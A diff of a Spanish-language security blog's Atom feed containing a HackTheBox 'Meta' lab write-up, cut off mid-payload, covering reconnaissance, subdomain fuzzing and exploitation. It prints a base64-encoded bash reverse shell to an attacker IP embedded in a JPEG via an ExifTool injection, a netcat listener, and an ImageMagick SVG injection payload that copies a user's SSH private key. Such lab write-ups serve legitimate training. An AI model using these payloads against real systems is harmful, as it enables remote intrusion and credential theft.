@@ -1,4 +1,346 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-07-02T20:23:35-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">THM Mr. Robot</title><link href="http://localhost:4000/mrrobot/" rel="alternate" type="text/html" title="THM Mr. Robot" /><published>2022-06-15T00:00:00-05:00</published><updated>2022-06-15T00:00:00-05:00</updated><id>http://localhost:4000/mrrobot</id><content type="html" xml:base="http://localhost:4000/mrrobot/">&lt;p align=&quot;center&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-07-07T11:18:16-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">HTB Meta</title><link href="http://localhost:4000/meta/" rel="alternate" type="text/html" title="HTB Meta" /><published>2022-07-06T00:00:00-05:00</published><updated>2022-07-06T00:00:00-05:00</updated><id>http://localhost:4000/meta</id><content type="html" xml:base="http://localhost:4000/meta/">&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/meta/001-inicio.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;¡Hola!
+En esta ocasión vamos a resolver de la maquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Meta&lt;/code&gt; de &lt;a href=&quot;https://hackthebox.com/&quot;&gt;HackTheBox&lt;/a&gt;.
+La máquina es nivel “Medium”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!&lt;/p&gt;
+
+&lt;h2 id=&quot;preparación&quot;&gt;PREPARACIÓN&lt;/h2&gt;
+
+&lt;p&gt;Para iniciar nuestra máquina, vamos a crear con nuestra función &lt;a href=&quot;https://bast1ant1c.github.io/mkhack/&quot;&gt;mkhack&lt;/a&gt; un directorio de trabajo con el nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;meta&lt;/code&gt; y los subdirectorios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; junto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;, con el objetivo de organizar la información que recopilemos en la realización de la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ mkhack meta
+❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;recon
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;reconocimiento&quot;&gt;RECONOCIMIENTO&lt;/h2&gt;
+
+&lt;p&gt;Accedemos al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de una traza &lt;strong&gt;ICMP&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.11.140 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;ttl | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $4 $6}'&lt;/span&gt;
+10.10.11.140:ttl&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Identificamos que es una maquina &lt;strong&gt;Linux&lt;/strong&gt; debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;TTL =&amp;gt; 64	Linux&lt;/li&gt;
+  &lt;li&gt;TTL =&amp;gt; 128	Windows&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Continuamos con la enumeración de los &lt;strong&gt;65535&lt;/strong&gt; puertos en la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.11.140 &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; ports | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;open
+22/tcp open  ssh
+80/tcp open  http
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Luego de identificar los puertos abiertos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OPEN&lt;/code&gt;, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; 10.10.11.140 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; allInfo
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-06-15 23:39 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.140
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.090s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd
+|_http-server-header: Apache
+|_http-title: Did not follow redirect to http://artcorp.htb
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;enumeracion-web&quot;&gt;ENUMERACION WEB&lt;/h2&gt;
+
+&lt;p&gt;Podemos identificar que el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; tiene una página web en servicio, por lo que revisamos con el explorador la página en cuestión sin lograr evidenciar algún contenido.&lt;/p&gt;
+
+&lt;p&gt;Se procede a realizar la enumeración de servicios web identificando un redireccionamiento de la dirección IP a el dominio artcorp.htb.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.11.140
+http://10.10.11.140 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;301 Moved Permanently] Apache, Country[RESERVED][ZZ], HTTPServer[Apache], IP[10.10.11.140], RedirectLocation[http://artcorp.htb]
+http://artcorp.htb &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.11.140], Title[Home]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;virtual-hosting&quot;&gt;VIRTUAL HOSTING&lt;/h2&gt;
+
+&lt;p&gt;Podemos revisar las cabeceras de la petición web con el mismo resultado.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-sI&lt;/span&gt; http://10.10.11.140
+HTTP/1.1 301 Moved Permanently
+Date: Thu, 16 Jun 2022 04:40:51 GMT
+Server: Apache
+Location: http://artcorp.htb
+Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UTF-8
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como se puede identificar tenemos un virtual hosting, por lo que necesitamos modificar nuestro fichero &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;vim /etc/hosts
+10.10.11.140    artcorp.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+  &lt;img src=&quot;/assets/images/meta/02-page.png&quot; /&gt;       
+  &lt;/p&gt;
+
+&lt;h2 id=&quot;fuzzing-de-subdominios&quot;&gt;FUZZING DE SUBDOMINIOS&lt;/h2&gt;
+
+&lt;p&gt;Ahora que tenemos alcance a la maquina victima, vamos a realizar un &lt;strong&gt;fuzzing&lt;/strong&gt; por medio de la generación de múltiples peticiones con diferentes terminaciones a la página web, con el fin de detectar subdominios de acceso a información o explotación, identificando potenciales rutas de acceso, vamos a mirar de que se tratan.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 200 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404,301 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: FUZZ.rtcorp.htb&quot;&lt;/span&gt; http://artcorp.htb
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://artcorp.htb/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                              
+=====================================================================
+
+000001492:   200        9 L      24 W       247 Ch      &quot;dev01&quot;  
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Encontramos el subdominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dev01&lt;/code&gt;, vamos a agregar el subdominio al fichero &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;vim /etc/hosts
+10.10.11.140    artcorp.htb dev01.artcorp.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora que tenemos dos subdominios podremos ver un poco más a detalle la página web y así mismo podemos detectar que hay una ruta que nos permite cargar archivos como imágenes en formatos jpg y png.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+ &lt;img src=&quot;/assets/images/meta/03-page2.png&quot; /&gt;       
+ &lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+  &lt;img src=&quot;/assets/images/meta/03-page3.png&quot; /&gt;       
+  &lt;/p&gt;
+
+&lt;h2 id=&quot;exploit&quot;&gt;EXPLOIT&lt;/h2&gt;
+
+&lt;p&gt;Para esta ocasión vamos a hacer uso de la herramienta &lt;a href=&quot;https://github.com/OneSecCyber/JPEG_RCE&quot;&gt;JPEG_RCE&lt;/a&gt; del github de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OneSecCyber&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Ingresamos a nuestra carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt; y procedemos a descargar la herramienta.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../exploit/
+https://github.com/OneSecCyber/JPEG_RCE
+git clone https://github.com/OneSecCyber/JPEG_RCE.git
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;JPEG_RCE
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación, codificaremos una reverse shell de bash en base64, esto para que pueda ser interpretado el comando al momento de subir el archivo a la maquina víctima.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.78/4444 0&amp;gt;&amp;amp;1'&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64
+&lt;/span&gt;YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43OC80NDQ0IDA+JjEnCg&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Luego de obtener la codificación, ejecutamos el siguiente comando sugerido en la documentación de la herramienta que descargamos anteriormente.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ exiftool &lt;span class=&quot;nt&quot;&gt;-config&lt;/span&gt; eval.config runme.jpg &lt;span class=&quot;nt&quot;&gt;-eval&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'system(&quot;echo '&lt;/span&gt;YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43OC80NDQ0IDA+JjEnCg&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' | base64 -d | bash&quot;)'&lt;/span&gt;
+    1 image files updated
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;¡Muy bien! Precedemos a subir la imagen &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runme.jpg&lt;/code&gt; a la página víctima, sin embargo, antes de darle clic al botón para finalizar el proceso, debemos hacer un último paso, es necesario ponernos en escucha con la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; con el puerto que se indica al momento de realizar la reverse shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4444
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4444 ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora sí, es momento de subir la imagen y dar clic en el botón para terminar el proceso en la página web y cómo podemos ver, ¡acto seguido obtenemos una shell de la maquina victima!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4444
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4444 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.78] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.11.140] 56278
+bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;639&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+www-data@meta:/var/www/dev01.artcorp.htb/metaview&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+whoami
+&lt;/span&gt;www-data
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;procmonsh&quot;&gt;PROCMON.SH&lt;/h2&gt;
+
+&lt;p&gt;Excelente! Sin embargo, por el momento solo somos el usuario www-data, así que luego de realizar diversos intentos de enumeraciones para escalar privilegios fallidas, ejecutamos un script denominado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;procmon.sh&lt;/code&gt; el cual nos va a permitir monitorear los comandos se están ejecutando en tiempo real en la máquina.&lt;/p&gt;
+
+&lt;p&gt;Vamos a ir a la carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; y con la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nano&lt;/code&gt; creamos el archivo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
+
+nano procmon.sh
+
+&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;old_process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;ps &lt;span class=&quot;nt&quot;&gt;-eo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;new_process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;ps &lt;span class=&quot;nt&quot;&gt;-eo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+        diff &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$old_process&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$new_process&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;gt;\&amp;lt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;]&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vE&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;procmon | command | kworker&quot;&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;old_process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$new_process&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Una vez es ejecutado el archivo anterior, encontramos los siguientes comandos que han sido ejecutados, entre ellos se menciona el fichero convert_images.sh&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@meta:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./procmon.sh
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /usr/local/bin/convert_images.sh
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /bin/bash /usr/local/bin/convert_images.sh
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /usr/local/bin/mogrify &lt;span class=&quot;nt&quot;&gt;-format&lt;/span&gt; png &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&amp;lt; /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;
+&amp;lt; /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /usr/local/bin/convert_images.sh
+&amp;lt; /bin/bash /usr/local/bin/convert_images.sh
+&amp;lt; /usr/local/bin/mogrify &lt;span class=&quot;nt&quot;&gt;-format&lt;/span&gt; png &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Leemos el fichero &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;convet_images.sh&lt;/code&gt; para entender su lógica y tomar provecho de ello.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@meta:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/local/bin/convert_images.sh
+&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/www/dev01.artcorp.htb/convert_images/ &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; /usr/local/bin/mogrify &lt;span class=&quot;nt&quot;&gt;-format&lt;/span&gt; png &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 2&amp;gt;/dev/null
+pkill mogrify
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;poc-de-inyeccion&quot;&gt;POC DE INYECCION&lt;/h2&gt;
+
+&lt;p&gt;Vamos a realizar el escalamiento de privilegios por medio de la llave id_rsa del usuario &lt;strong&gt;Thomas&lt;/strong&gt;, para esto vamos a seguir la guía de &lt;a href=&quot;https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html&quot;&gt;insert-script&lt;/a&gt; para inyectar y lograr leer el contenido de la llave puesto que no tenemos permisos de lectura a este fichero.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@meta:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /dev/shm
+www-data@meta:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nano poc.svg
+
+&amp;lt;image &lt;span class=&quot;nv&quot;&gt;authenticate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ff&quot; `cat /home/thomas/.ssh/id_rsa &amp;gt; /dev/shm/id_rsa`;&quot;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+  &amp;lt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;pdf:/etc/passwd&quot;&lt;/span&gt;/&amp;gt;
+  &amp;lt;get &lt;span class=&quot;nv&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;base-width&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;base-height&quot;&lt;/span&gt; /&amp;gt;
+  &amp;lt;resize &lt;span class=&quot;nv&quot;&gt;geometry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;400x400&quot;&lt;/span&gt; /&amp;gt;
+  &amp;lt;write &lt;span class=&quot;nv&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;test.png&quot;&lt;/span&gt; /&amp;gt;
